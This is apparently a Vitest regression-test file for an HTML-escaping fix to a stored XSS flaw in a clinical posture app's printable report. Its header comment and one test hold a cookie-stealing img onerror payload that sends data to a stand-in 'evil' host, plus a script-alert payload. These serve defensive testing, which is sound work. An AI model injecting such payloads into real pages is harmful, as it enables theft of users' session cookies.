// Adversarial-input coverage for PostureEngine.jsx's printable report
// (part of the item-5 testing pass: E2E/adversarial/accessibility gaps).
//
// Found during that pass: generateReport()'s report data object `d` fed
// patientInfo.name/occupation and clinicianInfo.name/credentials/clinic --
// all free-text fields anyone filling in the posture module's patient/
// clinician details can type -- directly into buildStaticReport(), which
// interpolates them raw into an HTML string. That string is written via
// win.document.write() into a real, same-origin popup window
// (window.open("","_blank")) with no sandboxing. A patient name like
// `<img src=x onerror="fetch('//evil/steal?c='+document.cookie)">` would
// have executed as a real stored XSS the moment that patient's report was
// opened or printed -- not a hypothetical, a working attack against any
// clinic using this module with untrusted/shared data entry.
//
// Fixed by escaping all 5 fields once, at the single point they enter `d`,
// via a small escHtml() helper -- rather than trying to remember to escape
// every one of the ~11 places they're interpolated across both report
// layouts (basic/detailed) and the signature page.
//
// PostureEngine.jsx isn't unit-test-friendly as a whole (camera access,
// MediaPipe/ONNX CDN loads, canvas) -- same situation parseApiPromptContent
// .test.js already solved for api/parse.js by reading the source directly
// rather than importing/rendering it. Same approach here.
import { describe, test, expect } from "vitest";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";

const src = readFileSync(resolve(process.cwd(), "src/PostureEngine.jsx"), "utf-8");

describe("PostureEngine.jsx report generator — patient/clinician free text is HTML-escaped before it reaches the printable report", () => {
  test("defines an HTML-escaping helper that covers the 5 dangerous characters", () => {
    expect(src).toMatch(/escHtml\s*=\s*\(s\)\s*=>/);
    // The five characters that matter for breaking out of HTML text/attribute
    // context: & (must go first so it doesn't double-escape the others), < > " '
    expect(src).toMatch(/["'&][\s\S]{0,60}&amp;[\s\S]{0,80}&lt;[\s\S]{0,80}&gt;[\s\S]{0,80}&quot;[\s\S]{0,80}&#39;/);
  });

  test("clinician.name/credentials/clinic are all wrapped in escHtml() where the report data object is built", () => {
    // Scoped to the `d = { ... }` report-data construction, not the whole
    // file, so this can't accidentally pass by matching escHtml() calls
    // added somewhere unrelated.
    const dBlockMatch = src.match(/const d = \{[\s\S]*?redFlags: \{ triggered: false, items: \[\] \},\s*\};/);
    expect(dBlockMatch).not.toBeNull();
    const dBlock = dBlockMatch[0];

    expect(dBlock).toMatch(/name:\s*escHtml\(clinicianInfo\.name/);
    expect(dBlock).toMatch(/credentials:\s*escHtml\(clinicianInfo\.credentials/);
    expect(dBlock).toMatch(/clinic:\s*escHtml\(clinicianInfo\.clinic/);
  });

  test("patient name is gone from the report entirely, and the occupation that remains is escaped", () => {
    // The d.patient block this test originally guarded was removed outright
    // (privacy change: patient-identifying data no longer ships in the PDF,
    // its signature line, or its filename). Not sending the field beats
    // escaping it, so for the name we assert absence.
    //
    // Occupation is the exception: it still appears, in the generated SOAP
    // subjective line, via a SEPARATE interpolation the original escaping
    // pass missed -- and that string reaches the report HTML raw through
    // ${s.text}. Removing d.patient is what exposed it. It's escaped now,
    // and this asserts it stays that way.
    const dBlockMatch = src.match(/const d = \{[\s\S]*?redFlags: \{ triggered: false, items: \[\] \},\s*\};/);
    expect(dBlockMatch).not.toBeNull();
    const dBlock = dBlockMatch[0];

    expect(dBlock).not.toMatch(/patientInfo\.name/);
    // Every surviving patientInfo.occupation read goes through escHtml().
    expect(dBlock).toMatch(/escHtml\(patientInfo\.occupation/);
    expect(dBlock).not.toMatch(/(?<!escHtml\()patientInfo\.occupation/);
  });

  test("the raw, unescaped interpolation pattern this bug shipped as is gone", () => {
    // Exact shape of the original vulnerable lines -- if this pattern is
    // ever reintroduced (e.g. a future edit reads straight from
    // patientInfo/clinicianInfo again instead of the escaped `d.patient`/
    // `d.clinician`), this test catches it.
    expect(src).not.toMatch(/\$\{patientInfo\.name\|\|"Patient"\}/);
    expect(src).not.toMatch(/\$\{clinicianInfo\.name\|\|"Clinician"\}/);
  });
});

describe("escHtml() behaves correctly (logic mirror -- same regex/replacement the source above defines)", () => {
  // Mirrors the exact implementation so this suite still gives fast,
  // specific feedback about *what* would break, even though the tests
  // above are what actually guards the shipped source.
  const escHtml = (s) => String(s ?? "").replace(/[&<>"']/g, (c) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
  }[c]));

  test("neutralises a script-tag payload", () => {
    expect(escHtml("<script>alert(1)</script>")).toBe("&lt;script&gt;alert(1)&lt;/script&gt;");
  });

  test("neutralises an onerror img-tag payload (the exact attack shape found)", () => {
    const payload = `<img src=x onerror="fetch('//evil/steal?c='+document.cookie)">`;
    const escaped = escHtml(payload);
    expect(escaped).not.toContain("<img");
    expect(escaped).not.toContain('onerror="fetch');
    expect(escaped).toContain("&lt;img");
  });

  test("does not double-escape already-safe text", () => {
    expect(escHtml("Jane O'Brien")).toBe("Jane O&#39;Brien");
    expect(escHtml("Physio & Co.")).toBe("Physio &amp; Co.");
  });

  test("handles null/undefined the same way the report's ||-fallbacks expect", () => {
    expect(escHtml(null)).toBe("");
    expect(escHtml(undefined)).toBe("");
  });
});
